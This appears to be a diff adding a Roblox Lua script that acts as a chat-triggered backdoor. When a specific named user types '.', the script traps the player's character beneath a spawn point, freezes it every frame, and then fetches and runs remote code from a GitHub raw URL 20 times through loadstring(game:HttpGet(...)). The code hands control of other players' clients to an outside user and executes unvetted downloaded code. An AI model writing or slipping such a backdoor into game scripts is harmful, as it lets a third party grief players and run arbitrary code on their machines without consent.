@@ -1,0 +1,81 @@
+-- Teleport & freeze + run loadstring 20 times
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+if not player then return end
+
+local function getNearestSpawn(position)
+    local closestSpawn = nil
+    local shortestDistance = math.huge
+
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("SpawnLocation") then
+            local distance = (obj.Position - position).Magnitude
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestSpawn = obj
+            end
+        end
+    end
+
+    return closestSpawn
+end
+
+local freezeConnection
+
+local channel = TextChatService.TextChannels.RBXGeneral
+channel.MessageReceived:Connect(function(message)
+
+    if not message.TextSource then return end
+    if message.TextSource.Name ~= "RavoxRBLX" then return end
+    if message.Text ~= "." then return end
+
+    local character = player.Character or player.CharacterAdded:Wait()
+    task.wait(0.2) -- ensure character loaded
+
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    local humanoid = character:WaitForChild("Humanoid")
+
+    local spawn = getNearestSpawn(hrp.Position)
+    if not spawn then
+        warn("No spawn found")
+        return
+    end
+
+    local targetCFrame = spawn.CFrame * CFrame.new(0,-8,0)
+
+    -- teleport
+    hrp.Anchored = true
+    hrp.CFrame = targetCFrame
+
+    -- stop movement
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+
+    -- stop idle animations
+    for _,track in ipairs(humanoid:GetPlayingAnimationTracks()) do
+        track:Stop()
+    end
+
+    -- keep character locked
+    if freezeConnection then
+        freezeConnection:Disconnect()
+    end
+
+    freezeConnection = RunService.RenderStepped:Connect(function()
+        if hrp then
+            hrp.CFrame = targetCFrame
+        end
+    end)
+
+    -- run loadstring 20 times
+    for i = 1,20 do
+        task.spawn(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/porpora02-ai/d/refs/heads/main/infyeild"))()
+        end)
+    end
+
+end)
